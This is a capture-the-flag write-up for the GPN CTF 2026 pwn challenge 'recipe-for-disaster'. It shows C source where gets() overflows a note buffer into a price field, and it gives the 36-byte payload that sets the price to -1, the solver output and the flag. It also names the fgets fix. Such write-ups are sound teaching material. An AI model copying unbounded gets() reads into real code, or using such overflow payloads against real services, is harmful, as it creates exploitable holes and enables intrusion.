# recipe-for-disaster

**Category:** Pwn  
**Event:** GPN CTF 2026

> No Vulnerabilities. Guaranteed.

**Flag:** `GPNCTF{Wa17, w17h theS3 prICEs, 0verf1oWS shOUld NoT 83 P0sS1Ble...}`

## TL;DR

`gets()` inside the note-entry loop lets us overflow `note[32]` directly into
the adjacent `int price` field in the same `Item` struct. Writing 32 bytes of
padding followed by `\xff\xff\xff\xff` sets `price = -1`. The receipt total
becomes negative, triggering `verify_total()` → `print_coupon()` → flag.

## Source

```c
typedef struct {
  char item[32];
  char note[32];
  int  price;
} Item;

void take_order(void) {
  const int order_count = 10;
  Item order[order_count];          // stack-allocated array of 10 Items
  int  n_items = 0;
  // ...
  Item *cur = &order[n_items];
  strncpy(cur->item, MENU[choice - 1].name, sizeof(cur->item) - 1);
  cur->price = MENU[choice - 1].price;          // set BEFORE gets()

  printf("Any note for the chef? (leave blank for none)\n> ");
  gets(cur->note);                              // <-- unbounded read
  // ...
  int total = calculate_total(order, n_items);
  verify_total(total);
}

void verify_total(int total) {
  if (total < 0) {
    print_coupon();   // reads /flag
    exit(0);
  }
  // ...
}
```

## Analysis

### Struct memory layout

`Item` has no padding between `note` and `price`:

```
offset  0  – 31 : char item[32]
offset 32  – 63 : char note[32]
offset 64  – 67 : int  price
```

`gets()` writes into `note` starting at offset 32, with **no length limit**.
A payload longer than 32 bytes spills directly into `price`.

### The win condition

`verify_total()` calls `print_coupon()` — which opens `/flag` and prints it —
whenever the running total is **negative**. Overwriting `price` with any
negative 32-bit integer satisfies this. `0xffffffff` (`-1` in two's complement)
is the simplest choice.

### Why `price` is set before `gets()`

The original `MENU` price is assigned to `cur->price` *before* the note is
read. `gets()` then overwrites it. The subsequent `printf("Added: %s ($%d)")`
already shows the corrupted value — `$-1` — confirming the overflow worked.

## Exploit

```
Order menu item #1 (any item works)
Note: b"A" * 32 + b"\xff\xff\xff\xff"
Finish ordering (enter 0)
```

Step-by-step:

1. Send `1\n` → server sets `price = 1337`, then prompts for a note.
2. Send `b"A" * 32 + b"\xff\xff\xff\xff" + b"\n"` →
   `gets()` writes 36 bytes into `note`; the last 4 bytes land at `price`,
   overwriting it with `0xffffffff = -1`.
3. Send `0\n` → finish.
4. `calculate_total` sums one item: `total = -1`.
5. `verify_total(-1 < 0)` → `print_coupon()` → flag.

### Full solver

See [`solve.py`](./solve.py) (stdlib only — `socket` + `ssl`, no pwntools needed).

```
$ python3 solve.py
...
[SYSTEM] Pricing error detected! We sincerely apologise for
[SYSTEM] the inconvenience. Please accept this coupon:

GPNCTF{Wa17, w17h theS3 prICEs, 0verf1oWS shOUld NoT 83 P0sS1Ble...}
```

## Why "No Vulnerabilities. Guaranteed."

The banner proudly declares no vulnerabilities exist in the GPNCTF Food
Ordering System. The menu item named **"Overwritten Return Pointer"** (price
1337) is a self-aware joke — the challenge name and the first menu entry both
hint at the real bug. `gets()` has been a known vulnerability since the Morris
Worm (1988) and has been deprecated since C11 / POSIX.1-2008. The fix is a
single character change: replace `gets(cur->note)` with
`fgets(cur->note, sizeof(cur->note), stdin)`.
